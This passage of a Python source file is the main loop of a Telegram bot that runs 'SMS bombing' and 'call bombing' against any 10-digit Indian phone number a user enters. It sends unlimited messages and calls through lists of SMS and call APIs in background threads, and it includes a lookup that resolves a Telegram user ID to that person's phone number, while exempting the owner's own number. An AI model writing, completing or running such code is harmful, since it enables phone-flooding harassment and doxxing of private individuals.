    print("╠════════════════════════════════════╣")
    print("║  🚀 BOT IS RUNNING...              ║")
    print("╚════════════════════════════════════╝")
    
    user_states = {}
    last_update_id = 0
    
    while True:
        try:
            updates = get_updates(last_update_id + 1 if last_update_id else None)
            
            for update in updates:
                last_update_id = update.get("update_id")
                message = update.get("message")
                
                if message:
                    chat_id = message.get("chat", {}).get("id")
                    text = message.get("text", "")
                    username = message.get("from", {}).get("first_name", "User")
                    
                    if chat_id:
                        # Check for number input in bombing mode
                        state = user_states.get(chat_id, "")
                        
                        if state == "awaiting_sms_bomb" and text.isdigit() and len(text) == 10:
                            if text == PROTECTED_NUMBER:
                                send_telegram_message(chat_id, WARNING_MSG, main_keyboard())
                                user_states[chat_id] = ""
                                continue
                            
                            if chat_id in BOMBING_ACTIVE and BOMBING_ACTIVE[chat_id]:
                                send_telegram_message(chat_id, "❌ Already bombing! Use STOP BOMB first.")
                                user_states[chat_id] = ""
                                continue
                            
                            start_msg = f"""💣 SMS BOMBING STARTED 💣
━━━━━━━━━━━━━━━━━━━━━━━━━━
📡 APIs: {len(SMS_APIS)}
⚡ MODE: UNLIMITED
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 TARGET: +91{text}
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ Press STOP BOMB to stop"""
                            
                            send_telegram_message(chat_id, start_msg)
                            
                            thread = threading.Thread(target=bombing_worker, args=(chat_id, text, "sms"))
                            thread.daemon = True
                            thread.start()
                            
                            user_states[chat_id] = ""
                        
                        elif state == "awaiting_call_bomb" and text.isdigit() and len(text) == 10:
                            if text == PROTECTED_NUMBER:
                                send_telegram_message(chat_id, WARNING_MSG, main_keyboard())
                                user_states[chat_id] = ""
                                continue
                            
                            if chat_id in BOMBING_ACTIVE and BOMBING_ACTIVE[chat_id]:
                                send_telegram_message(chat_id, "❌ Already bombing! Use STOP BOMB first.")
                                user_states[chat_id] = ""
                                continue
                            
                            start_msg = f"""📞 CALL BOMBING STARTED 📞
━━━━━━━━━━━━━━━━━━━━━━━━━━
📡 APIs: {len(CALL_APIS)}
⚡ MODE: UNLIMITED
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 TARGET: +91{text}
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ Press STOP BOMB to stop"""
                            
                            send_telegram_message(chat_id, start_msg)
                            
                            thread = threading.Thread(target=bombing_worker, args=(chat_id, text, "call"))
                            thread.daemon = True
                            thread.start()
                            
                            user_states[chat_id] = ""
                        
                        elif state == "awaiting_tgid" and text.isdigit():
                            if str(text) == PROTECTED_TG_ID:
                                send_telegram_message(chat_id, WARNING_MSG, main_keyboard())
                                user_states[chat_id] = ""
                                continue
                            
                            send_telegram_message(chat_id, "🆔 FETCHING PHONE NUMBER...")
                            result = tgid_to_number_api(text)
                            
                            if result and result != "PROTECTED":
                                final = f"""🆔 TG ID TO NUMBER RESULT
━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 USER ID: {text}
📞 PHONE: +{result.get('country_code', '91')}{result.get('number')}
🌍 COUNTRY: {result.get('country', 'India')}
━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 {OWNER}"""
                            else:
                                final = f"❌ Failed to fetch number for ID: {text}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n👑 {OWNER}"
                            
                            send_telegram_message(chat_id, final, main_keyboard())
                            user_states[chat_id] = ""
                        
                        else:
                            new_state = handle_message(chat_id, text, username)
                            if new_state:
                                user_states[chat_id] = new_state
                            elif state:
                                user_states[chat_id] = ""
            
            # Send periodic stats for active bombings
            for chat_id in list(BOMBING_ACTIVE.keys()):
                if BOMBING_ACTIVE.get(chat_id, False):
                    send_bombing_stats(None, chat_id)
            
            time.sleep(1)
            
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
